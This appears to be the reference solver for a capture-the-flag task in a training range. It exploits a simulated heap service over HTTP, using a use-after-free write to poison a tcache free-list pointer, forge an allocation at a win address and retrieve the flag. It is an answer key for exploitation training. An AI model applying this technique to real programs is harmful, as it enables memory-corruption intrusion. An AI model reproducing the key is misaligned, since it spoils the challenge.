"""Intended-path solver: UAF into tcache fd poisoning into an arbitrary write."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

WIN_ADDR = 0x20000
WIN_MAGIC = 0xC0FFEE000001


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    expected = ctx.expected_flags["poison-and-win"]
    client = httpx.Client(base_url=ctx.url(), timeout=10)

    c1 = client.post("/api/malloc", json={"size": 64}).json()
    c2 = client.post("/api/malloc", json={"size": 64}).json()
    assert c1["id"] == "c1" and c1["addr"] == "0x10040", c1
    assert c2["id"] == "c2" and c2["addr"] == "0x10080", c2

    freed_c2 = client.post("/api/free", json={"id": "c2"}).json()
    assert freed_c2["fd_slot"] == "0x0", freed_c2
    freed_c1 = client.post("/api/free", json={"id": "c1"}).json()
    assert freed_c1["fd_slot"] == "0x10080", freed_c1

    state = client.get("/api/state").json()
    by_id = {row["id"]: row for row in state["chunks"]}
    assert all(by_id[i]["state"] == "freed" for i in ("c1", "c2")), by_id

    poisoned = client.post(
        "/api/write", json={"id": "c1", "offset": 0, "value": hex(WIN_ADDR)}
    ).json()
    assert poisoned["kind"] == "uaf-write", poisoned

    pop = client.post("/api/malloc", json={"size": 64}).json()
    assert pop["id"] == "c1" and pop["promoted_fd"] == hex(WIN_ADDR), pop

    forged = client.post("/api/malloc", json={"size": 64}).json()
    assert forged["source"] == "tcache" and int(forged["addr"], 16) == WIN_ADDR, forged

    win_write = client.post(
        "/api/write",
        json={"id": forged["id"], "offset": 0, "value": hex(WIN_MAGIC)},
    ).json()
    assert win_write["wrote"] == hex(WIN_ADDR), win_write

    result = client.get("/api/win").json()
    client.close()
    ok = bool(result.get("won")) and result.get("flag") == expected
    captured = result.get("flag")
    detail = None if ok else f"win_state={result}"
    return SolveResult(
        results=[TaskResult(task_id="poison-and-win", ok=ok, captured=captured, detail=detail)]
    )
